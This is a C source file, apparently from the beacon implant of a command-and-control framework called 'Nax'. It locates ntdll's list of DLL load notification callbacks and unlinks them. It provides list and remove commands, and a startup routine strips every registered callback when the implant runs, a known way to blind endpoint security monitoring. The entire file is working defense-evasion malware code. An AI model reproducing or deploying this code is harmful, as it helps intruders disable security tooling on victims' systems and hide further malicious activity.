/* beacon/src/Commands/DllNotify.c
 * List and remove DLL load notification callbacks (LdrRegisterDllNotification).
 *
 * Technique: register a temp callback to find the list head in ntdll .data,
 * then walk the doubly-linked list to enumerate/unlink entries.
 * Reference: rad9800/misc - UnregisterAllLdrRegisterDllNotification.c */

#include "Nax.h"

/* ========= [ dummy callback for list-head discovery ] ========= */

FUNC VOID NTAPI NaxDllNotifyDummy(
    ULONG                       NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA  NotificationData,
    PVOID                       Context
) {
    (void)NotificationReason;
    (void)NotificationData;
    (void)Context;
}

/* ========= [ find the list head ] ========= */

FUNC PLIST_ENTRY NaxGetDllNotificationListHead( PNAX_INSTANCE Nax ) {
    if ( !Nax->Ntdll.LdrRegisterDllNotification || !Nax->Ntdll.LdrUnregisterDllNotification )
        return NULL;

    HMODULE hNtdll = Nax->Ntdll.Handle;
    if ( !hNtdll ) return NULL;

    PVOID cookie = NULL;
    NTSTATUS st  = Nax->Ntdll.LdrRegisterDllNotification( 0, NaxDllNotifyDummy, NULL, &cookie );
    if ( st != 0 || !cookie ) return NULL;

    PLDR_DLL_NOTIFICATION_ENTRY entry = (PLDR_DLL_NOTIFICATION_ENTRY)cookie;

    PIMAGE_NT_HEADERS ntHdr = C_PTR( U_PTR( hNtdll ) + ((PIMAGE_DOS_HEADER)hNtdll)->e_lfanew );
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( ntHdr );
    PVOID dataStart = NULL;
    PVOID dataEnd   = NULL;
    for ( WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++ ) {
        if ( sec[i].Name[0] == '.' && sec[i].Name[1] == 'd' &&
             sec[i].Name[2] == 'a' && sec[i].Name[3] == 't' &&
             sec[i].Name[4] == 'a' ) {
            dataStart = C_PTR( U_PTR( hNtdll ) + sec[i].VirtualAddress );
            dataEnd   = C_PTR( U_PTR( dataStart ) + sec[i].Misc.VirtualSize );
            break;
        }
    }

    PLIST_ENTRY head = NULL;
    if ( dataStart && dataEnd ) {
        PLIST_ENTRY cur = entry->List.Flink;
        while ( cur != &entry->List ) {
            if ( U_PTR( cur ) >= U_PTR( dataStart ) &&
                 U_PTR( cur ) <  U_PTR( dataEnd ) ) {
                head = cur;
                break;
            }
            cur = cur->Flink;
        }
    }

    Nax->Ntdll.LdrUnregisterDllNotification( cookie );
    return head;
}

/* ========= [ list callbacks ] ========= */

FUNC INT NaxCmdDllNotifyList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    PLIST_ENTRY head = NaxGetDllNotificationListHead( Nax );
    if ( !head ) {
        UINT32 cap = *out_len;
        *out_len = 0;
        static const char err[] D_SEC( Bd ) = "Failed to locate DLL notification list head";
        UINT32 elen = 0;
        while ( err[elen] ) elen++;
        if ( elen <= cap ) {
            MmCopy( out, err, elen );
            *out_len = elen;
        }
        return NAX_ERR_FAIL;
    }

    UINT32 cap   = *out_len;
    UINT32 off   = 0;
    UINT32 count = 0;

    PLIST_ENTRY cur = head->Flink;
    while ( cur != head ) {
        PLDR_DLL_NOTIFICATION_ENTRY e = (PLDR_DLL_NOTIFICATION_ENTRY)cur;
        count++;

        static const char p1[] D_SEC( Bd ) = "[";
        static const char p2[] D_SEC( Bd ) = "] callback=";
        static const char p3[] D_SEC( Bd ) = " ctx=";
        static const char nl[] D_SEC( Bd ) = "\n";
        off = NaxAppendStr( (PCHAR)out, off, cap, p1 );
        off = NaxAppendInt( (PCHAR)out, off, cap, count );
        off = NaxAppendStr( (PCHAR)out, off, cap, p2 );
        off = NaxAppendPtr( (PCHAR)out, off, cap, U_PTR( e->Callback ) );
        off = NaxAppendStr( (PCHAR)out, off, cap, p3 );
        off = NaxAppendPtr( (PCHAR)out, off, cap, U_PTR( e->Context ) );
        off = NaxAppendStr( (PCHAR)out, off, cap, nl );

        cur = cur->Flink;
    }

    if ( count == 0 ) {
        static const char none[] D_SEC( Bd ) = "No DLL notification callbacks registered";
        UINT32 nlen = 0;
        while ( none[nlen] ) nlen++;
        if ( nlen <= cap ) {
            MmCopy( out, none, nlen );
            off = nlen;
        }
    } else {
        static const char t1[] D_SEC( Bd ) = "Total: ";
        static const char t2[] D_SEC( Bd ) = " callback(s)";
        off = NaxAppendStr( (PCHAR)out, off, cap, t1 );
        off = NaxAppendInt( (PCHAR)out, off, cap, count );
        off = NaxAppendStr( (PCHAR)out, off, cap, t2 );
    }

    *out_len = off;
    return NAX_OK;
}

/* ========= [ remove all callbacks ] ========= */

FUNC INT NaxCmdDllNotifyRemove( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    PLIST_ENTRY head = NaxGetDllNotificationListHead( Nax );
    if ( !head ) {
        UINT32 cap = *out_len;
        *out_len = 0;
        static const char err[] D_SEC( Bd ) = "Failed to locate DLL notification list head";
        UINT32 elen = 0;
        while ( err[elen] ) elen++;
        if ( elen <= cap ) {
            MmCopy( out, err, elen );
            *out_len = elen;
        }
        return NAX_ERR_FAIL;
    }

    UINT32 count = 0;
    while ( head->Flink != head ) {
        PLIST_ENTRY entry = head->Flink;
        entry->Blink->Flink = entry->Flink;
        entry->Flink->Blink = entry->Blink;
        count++;
    }

    UINT32 cap = *out_len;
    UINT32 off = 0;
    static const char m1[] D_SEC( Bd ) = "Removed ";
    static const char m2[] D_SEC( Bd ) = " DLL notification callback(s)";
    off = NaxAppendStr( (PCHAR)out, off, cap, m1 );
    off = NaxAppendInt( (PCHAR)out, off, cap, count );
    off = NaxAppendStr( (PCHAR)out, off, cap, m2 );
    *out_len = off;

    return NAX_OK;
}

/* ========= [ startup unhook (called from Main.c) ] ========= */

FUNC VOID NaxDllNotifyUnhookAll( PNAX_INSTANCE Nax ) {
    PLIST_ENTRY head = NaxGetDllNotificationListHead( Nax );
    if ( !head ) return;

    UINT32 count = 0;
    while ( head->Flink != head ) {
        PLIST_ENTRY entry = head->Flink;
        entry->Blink->Flink = entry->Flink;
        entry->Flink->Blink = entry->Blink;
        count++;
    }

    NaxDbg( Nax, "DllNotify: removed %d callback(s) at startup", count );
}
